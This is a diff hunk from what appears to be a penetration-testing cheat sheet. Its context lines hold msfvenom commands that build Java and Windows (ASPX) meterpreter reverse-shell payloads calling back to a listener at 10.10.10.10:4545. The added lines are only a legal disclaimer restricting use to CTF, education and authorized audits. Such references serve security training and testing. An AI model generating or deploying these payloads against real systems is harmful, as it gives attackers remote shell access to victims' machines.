@@ -42,3 +42,15 @@ msfvenom -p java/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4545 -f raw > 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f aspx > aspx_met_10.10.10.10_4545.aspx
 ```
+
+<div align="center">
+
+### Legal Disclaimer
+
+**Maintained & Owned by 5kullk3r**
+
+*This material is created exclusively for authorized Capture The Flag (CTF) challenges, educational & ethical purposes, and legal security auditing with explicit permission.*
+
+<sub>Unauthorized system access is illegal. **5kullk3r** disclaims all liability for any misuse or damages.</sub>
+
+</div>
